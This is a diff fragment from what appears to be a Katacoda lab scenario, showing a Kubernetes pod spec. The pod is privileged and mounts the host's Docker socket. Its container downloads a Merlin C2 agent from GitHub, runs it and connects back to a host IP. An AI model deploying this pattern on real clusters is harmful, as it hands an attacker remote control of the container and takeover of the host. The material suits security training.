@@ -29,9 +29,16 @@ spec:
   containers:
   - name: priv-container
     image: ubuntu
+	volumes:
+	- name: docker-sock
+	  hostPath:
+	    path: /var/run/docker.sock
     command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443", "sleep infinity" ]
     securityContext:
       privileged: true
+    volumeMounts:
+	- name: docker-sock
+	  mountPath: /var/run/docker.sock
 EOF```{{execute T2}}  
 
 
